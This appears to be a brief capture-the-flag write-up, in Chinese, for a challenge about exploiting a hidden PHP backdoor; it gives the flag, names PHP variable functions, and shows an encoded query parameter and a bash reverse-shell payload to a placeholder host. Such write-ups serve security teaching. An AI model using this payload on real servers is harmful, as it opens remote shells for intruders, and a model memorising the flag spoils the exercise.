# open my backdoor
毛哥是一位年輕有為且腿毛多的資安研究員  
並且毛哥還是一位PHP大師，所以他在伺服器上放了只有他自己才看得懂的PHP後門  
但由於毛哥平時過於驕傲自大，你決定給他點顏色瞧瞧  
請你開他的後門，把藏在深處的那把flag挖出來吧!

[door](http://edu-ctf.csie.org:10151/)

## PoC
`FLAG{do_u_like_my_d0000000r?}`
* Variable functions
* `?87=%01HU%11`
* `%23=bash -c 'bash -i >%26 /dev/tcp/<ip>/<port> 0>%261'`
